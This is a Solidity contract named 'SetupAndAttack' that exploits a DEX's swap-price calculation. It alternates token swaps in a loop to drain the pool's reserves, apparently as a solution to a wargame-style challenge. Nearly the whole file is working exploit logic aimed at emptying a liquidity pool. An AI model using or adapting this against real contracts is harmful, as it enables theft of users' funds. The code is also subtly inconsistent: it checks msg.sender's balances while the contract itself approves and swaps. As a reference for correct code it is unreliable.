// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract SetupAndAttack {
    function checkSetup(address dexAddr) external view returns (bool isSetup, address token1, address token2) {
        IDex dex = IDex(dexAddr);
        
        // Try to get tokens with low-level calls to avoid reverting
        (bool success1, bytes memory data1) = dexAddr.staticcall(abi.encodeWithSignature("token1()"));
        (bool success2, bytes memory data2) = dexAddr.staticcall(abi.encodeWithSignature("token2()"));
        
        if (success1 && success2 && data1.length == 32 && data2.length == 32) {
            token1 = abi.decode(data1, (address));
            token2 = abi.decode(data2, (address));
            isSetup = (token1 != address(0) && token2 != address(0));
        } else {
            isSetup = false;
            token1 = address(0);
            token2 = address(0);
        }
    }
    
    function performAttack(address dexAddr) external returns (bool success) {
        IDex dex = IDex(dexAddr);
        
        // Get tokens
        address token1 = dex.token1();
        address token2 = dex.token2();
        
        if (token1 == address(0) || token2 == address(0)) {
            return false;
        }
        
        // Approve DEX
        dex.approve(address(dex), type(uint256).max);
        
        // Get initial balances
        uint256 myToken1 = dex.balanceOf(token1, msg.sender);
        uint256 myToken2 = dex.balanceOf(token2, msg.sender);
        
        // Perform swaps to drain the DEX
        uint256 count = 0;
        while (count < 10) {
            uint256 dexToken1 = dex.balanceOf(token1, address(dex));
            uint256 dexToken2 = dex.balanceOf(token2, address(dex));
            
            // Check if drained
            if (dexToken1 == 0 || dexToken2 == 0) {
                return true;
            }
            
            // Update our balances
            myToken1 = dex.balanceOf(token1, msg.sender);
            myToken2 = dex.balanceOf(token2, msg.sender);
            
            if (count % 2 == 0 && myToken1 > 0) {
                // Swap token1 for token2
                uint256 swapAmount = myToken1;
                
                // Check if we would drain token2
                uint256 expectedReturn = dex.getSwapPrice(token1, token2, swapAmount);
                if (expectedReturn >= dexToken2) {
                    // Calculate amount that will exactly drain token2
                    // We want: (amount * dexToken2) / (dexToken1 + amount) = dexToken2
                    // This simplifies to: amount = dexToken1
                    swapAmount = dexToken1;
                    
                    // Double check we won't overflow
                    expectedReturn = dex.getSwapPrice(token1, token2, swapAmount);
                    if (expectedReturn > dexToken2) {
                        // Use a smaller amount that gets us close
                        swapAmount = (dexToken1 * 99) / 100;
                    }
                }
                
                if (swapAmount <= myToken1) {
                    dex.swap(token1, token2, swapAmount);
                }
                
            } else if (count % 2 == 1 && myToken2 > 0) {
                // Swap token2 for token1
                uint256 swapAmount = myToken2;
                
                uint256 expectedReturn = dex.getSwapPrice(token2, token1, swapAmount);
                if (expectedReturn >= dexToken1) {
                    swapAmount = dexToken2;
                    
                    expectedReturn = dex.getSwapPrice(token2, token1, swapAmount);
                    if (expectedReturn > dexToken1) {
                        swapAmount = (dexToken2 * 99) / 100;
                    }
                }
                
                if (swapAmount <= myToken2) {
                    dex.swap(token2, token1, swapAmount);
                }
            }
            
            count++;
        }
        
        // Final check
        uint256 finalDex1 = dex.balanceOf(token1, address(dex));
        uint256 finalDex2 = dex.balanceOf(token2, address(dex));
        
        return (finalDex1 == 0 || finalDex2 == 0);
    }
}